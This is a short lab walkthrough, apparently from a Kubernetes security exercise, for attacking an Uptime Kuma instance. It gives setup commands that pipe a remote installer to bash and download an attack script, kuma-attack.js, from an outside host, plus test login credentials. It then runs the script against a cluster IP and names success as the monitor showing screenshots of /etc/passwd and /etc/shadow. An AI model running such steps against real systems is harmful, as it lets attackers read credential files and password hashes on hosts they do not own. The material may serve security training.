# Setup

```bash
kubectl apply -f https://k8s.adriansoftware.de/attacks/10/setup.yaml
# nodejs for running the attack
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
export NVM_DIR="$([ -z "${XDG_CONFIG_HOME-}" ] && printf %s "${HOME}/.nvm" || printf %s "${XDG_CONFIG_HOME}/nvm")"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh" # This loads nvm
nvm install --lts

curl https://k8s.adriansoftware.de/attacks/10/kuma-attack.js -o kuma-attack.js
npm install socket.io-client

# go to (masterip) browser 192.168.122.216:32711 -> create account -> create dummy type=REAL BROWSER to download chromium already
```

User: `k8s`
Password: `Kubernetes1`

# Attack

```bash
node kuma-attack.js --masterip 192.168.122.216
```

# Confirm

go to broser -> click on monitor -> see screenshot of /etc/passwd and /etc/shadow -> attack successfull